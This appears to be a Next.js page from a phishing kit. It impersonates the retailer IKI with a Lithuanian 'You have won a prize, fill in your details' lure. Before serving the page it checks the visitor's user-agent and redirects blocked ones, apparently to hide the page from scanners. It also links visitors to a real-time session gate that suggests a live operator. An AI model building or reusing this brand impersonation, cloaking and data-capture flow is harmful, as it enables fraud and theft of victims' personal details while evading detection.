import { headers } from "next/headers";
import { redirect } from "next/navigation";
import { SessionRealtimeGate } from "@/components/demo/SessionRealtimeGate";
import { WinFlow } from "@/components/demo/WinFlow";
import { resolveServerSessionIdentity } from "@/lib/session-id";
import { buildShareMetadata } from "@/lib/share-metadata";
import { getBlockedRedirectUrl } from "@/lib/geo-guard";
import { resumeOrRedirectHome } from "@/lib/session-resume";

export const dynamic = "force-dynamic";

export async function generateMetadata() {
  return buildShareMetadata({
    title: "IKI — Jūs laimėjote!",
    description:
      "Sveikiname! Jūs laimėjote IKI akcijos prizą. Užpildykite duomenis ir gaukite savo prizą.",
    canonical: "/win",
  });
}

type Props = {
  searchParams: Promise<{ session?: string }>;
};

export default async function WinPage({ searchParams }: Props) {
  const h = await headers();
  const blockedUrl = await getBlockedRedirectUrl(h.get("user-agent") || "");
  if (blockedUrl) redirect(blockedUrl);

  const params = await searchParams;
  await resumeOrRedirectHome(params);

  const { sessionId, routeSessionId } = await resolveServerSessionIdentity({
    searchParams: params,
  });

  return (
    <>
      <SessionRealtimeGate sessionId={sessionId ?? ""} routeSessionId={routeSessionId ?? undefined} />
      <WinFlow sessionId={sessionId} routeSessionId={routeSessionId} />
    </>
  );
}
